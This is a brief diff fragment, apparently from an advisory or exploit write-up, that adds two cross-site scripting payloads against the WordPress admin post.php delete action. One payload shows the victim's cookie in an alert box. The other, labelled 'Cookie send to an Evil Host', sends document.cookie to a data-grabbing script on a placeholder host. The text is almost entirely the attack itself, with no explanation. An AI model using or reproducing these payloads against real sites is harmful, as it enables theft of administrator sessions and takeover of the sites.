@@ -1,0 +1,9 @@
+Cookie in an Alert Box:
+&lt;iframe width=600 height=400
+src=&#039;http://www.example.com/wp-admin/post.php?action=delete&amp;post=%27%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Clol=
+%27&#039;&gt;&lt;/iframe&gt;
+
+Cookie send to an Evil Host:
+&lt;iframe width=600 height=400
+src=&#039;http://www.example.com/wp-admin/post.php?action=delete&amp;post=%27%3E%3Cscript%3Eimage=document.createElement(%27img%27);im
+age.src=%27http://www.example.com/datagrabber.php?cookie=%27%2bdocument.cookie;%3C/script%3E%3Clol=%27&#039;&gt;&lt;/iframe&gt;
